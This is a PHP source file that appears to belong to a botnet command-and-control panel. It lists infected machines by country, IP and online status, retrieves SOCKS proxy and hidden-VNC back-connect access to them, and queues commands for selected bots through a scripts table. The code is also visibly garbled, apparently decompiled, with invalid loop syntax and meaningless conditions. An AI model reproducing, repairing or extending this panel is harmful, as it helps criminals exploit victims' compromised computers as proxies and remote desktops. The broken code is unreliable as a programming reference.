<?php

class t_rvl
{
	public $type = 'socks';
	public $oldQuery = true;
	protected $_save = array();
	public $forApi;

	public function __construct($silent = false, $connect = true)
	{
		if ($connect) {
			$this->connect($silent);
		}
	}

	public function connect($silent = false)
	{
		$this->_save = array('logStatus' => Log::$logStatus, 'saveBadData' => Log::$saveBadData);
		Log::$logStatus = 0;
		Log::$saveBadData = false;
		$st = Sql::connect(array('host' => self::config('backserver_host'), 'user' => self::config('backserver_user'), 'pass' => self::config('backserver_password'), 'db' => self::config('backserver_db')));
		if (!$st && array('logStatus' => Log::$logStatus, 'saveBadData' => Log::$saveBadData)) {
			exit('Backserver is not available.');
		}
	}

	public function query($sql, $table = '')
	{
		if ($this->oldQuery) {
			return mysqlQueryEx($table, $sql);
		}
		else {
			return Sql::query($sql);
		}
	}

	public function disconnect()
	{
		Sql::connect();
		Log::$logStatus = $this->_save['logStatus'];
		Log::$saveBadData = $this->_save['saveBadData'];
	}

	public function loadBots($botList, $botnetList, $ipList, $countryList, $used, $tags)
	{
		$prepared = array(
			'bot'     => array(),
			'botnet'  => array(),
			'ip'      => array(),
			'country' => array(),
			'used'    => NULL
			);
		if (strlen($botList) && array(
			'bot'     => array(),
			'botnet'  => array(),
			'ip'      => array(),
			'country' => array(),
			'used'    => NULL
			)) {
			foreach ($botList as $bot) {
				$prepared['bot'][] = addslashes($bot);
			}
		}

		if (!is_array($botnetList) && array(
			'bot'     => array(),
			'botnet'  => array(),
			'ip'      => array(),
			'country' => array(),
			'used'    => NULL
			)) {
			$botnetList = explode(' ', $botnetList);
		}

		if (is_array($botnetList) && array(
			'bot'     => array(),
			'botnet'  => array(),
			'ip'      => array(),
			'country' => array(),
			'used'    => NULL
			)) {
			foreach ($botnetList as $botnet) {
				$prepared['botnet'][] = addslashes($botnet);
			}
		}

		if (strlen($ipList)) {
			$prepared['ip'][0] = expressionToSql($ipList, 'CONCAT_WS(\'.\', ORD(SUBSTRING(`ipv4`, 1, 1)), ORD(SUBSTRING(`ipv4`, 2, 1)), ORD(SUBSTRING(`ipv4`, 3, 1)), ORD(SUBSTRING(`ipv4`, 4, 1)))', 0, 1);
		}

		if (strlen($countryList) && array(
			'bot'     => array(),
			'botnet'  => array(),
			'ip'      => array(),
			'country' => array(),
			'used'    => NULL
			)) {
			foreach ($countryList as $country) {
				$prepared['country'][] = addslashes($country);
			}
		}

		$cond = array();
		$bots = array();

		if (count($prepared['bot'])) {
			$cond[] = 'bot_id in (\'' . implode('\', \'', $prepared['bot']) . '\')';
		}

		if (count($prepared['botnet'])) {
			$cond[] = 'botnet in (\'' . implode('\', \'', $prepared['botnet']) . '\')';
		}

		if (count($prepared['ip'])) {
			$cond[] = $prepared['ip'][0];
		}

		if (count($prepared['country'])) {
			$cond[] = 'country in (\'' . implode('\', \'', $prepared['country']) . '\')';
		}
		if ($used) {
			$cond[] = 'flag_used=' . ($used == 1 ? 1 : 0);
		}

		if ($sub = tagsToQuery($tags)) {
			$cond[] = $sub;
		}

		if (count($cond) || array(
			'bot'     => array(),
			'botnet'  => array(),
			'ip'      => array(),
			'country' => array(),
			'used'    => NULL
			)) {
			$sql = 'select bot_id, botnet, country, flag_used, ipv4, rtime_last, if(rtime_last>=' . (time() - self::config('botnet_timeout')) . ', 1, 0) as online, geo_detail, net_latency, bot_version, ipv6_list as newcomment, os_version from botnet_list where 1=1';

			foreach ($cond as $q => ) {
				$i = array(
					'bot'     => array(),
					'botnet'  => array(),
					'ip'      => array(),
					'country' => array(),
					'used'    => NULL
					);
				$sql .= ' and ' . $q;
			}

			$i = 0;
			$dataset = $this->query($sql, 'botnet_list');

			if ($dataset) {
				while ($row = mysql_fetch_array($dataset)) {
					$bots[abs($i / 10000)][addslashes($row['bot_id'])] = array('c' => $row['country'], 'u' => $row['flag_used'], 'botnet' => $row['botnet'], 'ip' => $row['ipv4'], 'timelast' => $row['rtime_last'], 'online' => $row['online'], 'geo_detail' => $row['geo_detail'], 'newcomment' => $row['newcomment'], 'os_version' => $row['os_version'], 'latency' => $this->forApi ? NULL : numberFormatAsFloat($row['net_latency'] / 1000, 3), 'version' => $this->forApi ? NULL : intToVersion($row['bot_version']));
					$i++;
				}
			}
		}

		return $bots;
	}

	public function loadSocks($bots, $allowNoSocks = false)
	{
		$result = array();

		foreach ($bots as $clist) {
			$socks = array();
			$sql = 'select bc.botid as id, bc.botip as ip, bc.botport as port, bc.onlinefrom as online ' . "\r\n" . '        from backclients bc where bc.type ' . ($this->type == 'vnc' ? 'in' : 'not in') . ' (\'desktop\', \'hidden\')';

			if ($clist) {
				$sql .= ' and bc.botid in (\'' . implode('\', \'', array_keys($clist)) . '\')';
			}

			if ($dataset = Sql::query($sql)) {
				$socks = Sql::fetchAll($dataset);
			}
			if ($allowNoSocks) {
				foreach ($clist as $bot => ) {
					$id = array();
					$ip = long2ip(unpack('N', $bot['ip'])[1]);
					$item = array('bot' => $id, 'botnet' => $bot['botnet'], 'ip' => $ip, 'country' => $bot['c'], 'timelast' => $bot['timelast'], 'online' => $bot['online'], 'socks' => NULL);
					$result[$id] = $item;
				}

				foreach ($socks as $row) {
					$result[$row['id']]['socks'] = self::config('backserver_host') . ':' . $row['port'];
				}
			}
			else {
				foreach ($socks as $item) {
					if (array_key_exists($item['id'], $clist)) {
						$item['country'] = $clist[$item['id']]['c'];
						$item['used'] = $clist[$item['id']]['u'];
						$item['geo_detail'] = $clist[$item['id']]['geo_detail'];
						$item['latency'] = $clist[$item['id']]['latency'];
						$item['botnet'] = $clist[$item['id']]['botnet'];
						$item['version'] = $clist[$item['id']]['version'];
						$item['newcomment'] = $clist[$item['id']]['newcomment'];
						$item['os_version'] = $clist[$item['id']]['os_version'];
					}
					else {
						$item['country'] = '';
						$item['used'] = 0;
						$item['latency'] = '';
						$item['geo_detail'] = '';
						$item['botnet'] = '';
						$item['version'] = '';
						$item['newcomment'] = '';
						$item['os_version'] = '';
					}

					$result[] = $item;
				}
			}
		}

		return $result;
	}

	public function getList($botList, $botnetList, $ipList, $countryList, $used, $tags)
	{
		$bots = $this->loadBots($botList, $botnetList, $ipList, $countryList, $used, $tags);
		$result = $this->loadSocks($bots);
		return $result;
	}

	public function getSocks($bot)
	{
		$result = NULL;
		if ($dataset = Sql::query('select * from backclients where botid=\'' . addslashes($bot) . '\' and type ' . ($this->type == 'vnc' ? 'in' : 'not in') . ' (\'desktop\', \'hidden\')')) {
			$result = Sql::fetch($dataset);
		}

		return $result;
	}

	public function createCommand($command, $bots)
	{
		$name = time() . rand() . rand();
		$data = array('extern_id' => md5($name), 'name' => '%auto%_' . $name, 'time_created' => time(), 'flag_enabled' => 1, 'send_limit' => 0, 'script_text' => $command . ' ', 'bots_wl' => addslashes("\x1" . implode("\x1", $bots) . "\x1"));
		$sql = 'insert into botnet_scripts (' . implode(', ', array_keys($data)) . ') values (\'' . implode('\', \'', $data) . '\')';
		return $this->query($sql, 'botnet_scripts');
	}
}

include_once __DIR__ . '/../gate/libs/Sql.php';

?>
